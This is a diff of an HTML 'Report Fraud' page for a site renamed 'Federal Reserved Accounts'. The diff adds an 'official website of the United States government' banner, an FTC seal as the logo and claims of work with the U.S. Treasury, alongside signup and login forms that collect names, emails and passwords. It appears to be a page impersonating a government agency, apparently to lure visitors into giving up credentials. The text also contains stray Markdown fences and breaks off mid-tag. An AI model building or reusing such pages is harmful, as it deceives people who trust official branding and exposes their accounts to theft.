@@ -1,109 +1,126 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safeguard Accounts - Report Fraud</title>
-  <link rel="stylesheet" href="report-fraud.css">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Report Fraud – Federal Reserved Accounts</title>
+  <meta name="description" content="Report fraudulent activity directly to the Federal Reserved Accounts system. Protect your financial security with verified U.S. government support." />
+  <link rel="icon" href="images/ftclogo.jpg" type="image/x-icon" />
+  <link rel="stylesheet" href="policies.css" />
+  <link rel="stylesheet" href="report-fraud.css" />
 </head>
+
 <body>
+  <!-- U.S. government banner -->
+  <div class="top-banner">
+    <img src="images/us_flag_small.png" alt="U.S. Flag" class="flag-img" />
+    <span class="banner-text">An official website of the United States government</span>
+  </div>
+
   <!-- Header -->
+
   <header class="header">
     <div class="logo">
-      <img src="images/ftclogo.jpg" alt="FTC Seal" class="logo-img">
-      <span>Safeguard Accounts</span>
+      <img src="images/ftclogo.jpg" alt="Federal Reserved Accounts Logo" class="logo-img" />
+      <span>Federal Reserved Accounts</span>
     </div>
-    <nav class="nav">
+    <nav class="nav" id="nav-links">
       <a href="index.html">Home</a>
       <a href="policies.html">Policies</a>
       <a href="report-fraud.html" class="active">Report Fraud</a>
-      <a href="#">About the FTC</a>
-      <a href="#">Login</a>
-      <a href="#">Sign Up</a>
-      <a href="#">Contact Us</a>
+      <a href="dashboard.html">Dashboard</a>
+      <a href="#" id="login-link">Login</a>
+      <a href="#" id="signup-link">Sign Up</a>
     </nav>
+    <button id="menu-toggle" class="menu-toggle" aria-label="Toggle navigation">☰</button>
   </header>
 
-  <!-- Hero -->
-  <section class="hero">
-    <h1>Report Fraud</h1>
-    <p>If you believe you’ve been a victim of fraud, please fill out this form so we can investigate and provide support.</p>
+  <!-- Hero Section -->
+
+  <section class="hero hero-home">
+    <div class="hero-content">
+      <h1>Report Fraud to Federal Reserved Accounts</h1>
+      <p class="tagline">Help us keep financial systems secure — report suspicious or fraudulent activity today.</p>
+      <p id="today-date" class="today-date"></p>
+    </div>
   </section>
 
-  <!-- Fraud Report Form -->
-  <main class="form-container">
-    <form id="fraudForm" class="fraud-form">
-      <div class="form-group">
-        <label for="fraudDetails">How did the fraud happen?</label>
-        <textarea id="fraudDetails" name="fraudDetails" required></textarea>
-      </div>
+  <!-- Report Fraud Section -->
 
-      <div class="form-group">
-        <label>Did someone contact you to commit fraud?</label>
-        <select name="contacted" id="contacted" required>
-          <option value="">--Select an option--</option>
-          <option value="phone">Yes, by phone</option>
-          <option value="email">Yes, by email</option>
-          <option value="text">Yes, by text</option>
-          <option value="inPerson">Yes, in person</option>
-          <option value="no">No</option>
-        </select>
-      </div>
+  <main class="container">
+    <section class="content-section">
+      <h2>Submit a Fraud Report</h2>
+      <p>
+        The Federal Reserved Accounts system works with U.S. Treasury and partner agencies to investigate
+        fraudulent activity that impacts federal account holders. If you believe your account has been
+        compromised or you’ve received suspicious communications, please use the form below.
+      </p>
+      <p>
+        Your information will remain secure and confidential. You may be contacted for verification
+        or follow-up investigation by authorized personnel.
+      </p>
 
-      <div class="form-group">
-        <label>Did you lose any credentials (passwords, PINs, etc.)?</label>
-        <select name="credentialsLost" id="credentialsLost" required>
-          <option value="">--Select an option--</option>
-          <option value="yes">Yes</option>
-          <option value="no">No</option>
-        </select>
-      </div>
+```
+  <form id="fraudReportForm" class="form">
+    <label for="fullName">Full Name</label>
+    <input type="text" id="fullName" name="fullName" required />
 
-      <div class="form-group">
-        <label>Did you lose any personal belongings?</label>
-        <div class="checkboxes">
-          <label><input type="checkbox" name="belongings" value="creditCard"> Credit Card</label>
-          <label><input type="checkbox" name="belongings" value="debitCard"> Debit Card</label>
-          <label><input type="checkbox" name="belongings" value="ssn"> Social Security Card</label>
-          <label><input type="checkbox" name="belongings" value="license"> Driver's License</label>
-          <label><input type="checkbox" name="belongings" value="passport"> Passport</label>
-          <label><input type="checkbox" name="belongings" value="other"> Other</label>
-        </div>
-      </div>
+    <label for="email">Email Address</label>
+    <input type="email" id="email" name="email" required />
 
-      <!-- New Question: Sensitive Info -->
-      <div class="form-group">
-        <label>Did you share any sensitive information (OTP, security codes, bank details)?</label>
-        <select name="sensitiveInfo" id="sensitiveInfo" required>
-          <option value="">--Select an option--</option>
-          <option value="yes">Yes</option>
-          <option value="no">No</option>
-        </select>
-      </div>
+    <label for="fraudType">Type of Fraud</label>
+    <select id="fraudType" name="fraudType" required>
+      <option value="">Select an option</option>
+      <option value="identity-theft">Identity Theft</option>
+      <option value="account-hacking">Account Hacking</option>
+      <option value="phishing">Phishing or Scam Email</option>
+      <option value="unauthorized">Unauthorized Transaction</option>
+      <option value="other">Other</option>
+    </select>
 
-      <!-- New Question: Date of Fraud -->
-      <div class="form-group">
-        <label for="fraudDate">What was the approximate date of the fraud?</label>
-        <input type="date" id="fraudDate" name="fraudDate" required>
-      </div>
+    <label for="description">Description</label>
+    <textarea id="description" name="description" rows="5" placeholder="Describe what happened..." required></textarea>
 
-      <div class="form-group">
-        <label for="additionalInfo">Additional Information</label>
-        <textarea id="additionalInfo" name="additionalInfo"></textarea>
-      </div>
+    <button type="submit" class="btn">Submit Report</button>
+    <p id="fraudReportMessage" class="success-message"></p>
+  </form>
+</section>
 
-      <button type="submit" class="submit-btn">Submit Report</button>
-      <p id="formMessage" class="form-message"></p>
-    </form>
+<section class="content-section">
+  <h2>Fraud Prevention Tips</h2>
+  <ul>
+    <li>Never share your Federal Reserved Account credentials or verification codes.</li>
+    <li>Verify all emails and messages claiming to be from government agencies.</li>
+    <li>Use multi-factor authentication on all financial accounts.</li>
+    <li>Immediately report unauthorized activity through this page.</li>
+  </ul>
+</section>
+```
+
   </main>
 
-  <!-- Footer -->
-  <footer class="footer">
-    <p>© 2025 Safeguard Accounts | Backed by the U.S. Treasury Department</p>
-  </footer>
+  <!-- Signup Modal -->
 
-  <script src="report-fraud.js"></script>
-</body>
-</html>
+  <div id="signup-modal" class="modal" aria-hidden="true">
+    <div class="modal-content">
+      <button class="close" data-close="signup-modal">&times;</button>
+      <h3>Create Your Federal Reserved Account</h3>
+      <form id="signupForm">
+        <input id="signupName" type="text" placeholder="Full Name" required />
+        <input id="signupEmail" type="email" placeholder="Email" required />
+        <input id="signupPassword" type="password" placeholder="Password" required />
+        <button type="submit" class="btn">Sign Up</button>
+      </form>
+    </div>
+  </div>
 
+  <!-- Login Modal -->
 
+  <div id="login-modal" class="modal" aria-hidden="true">
+    <div class="modal-content">
+      <button class="close" data-close="login-modal">&times;</button>
+      <h3>Login to Federal Reserved Accounts</h3>
+      <form id="loginForm">
+        <input id="loginEmail" type="email" placeholder="Email" required />
+        <input id="loginPassword" type="password" placeholder="Password" r
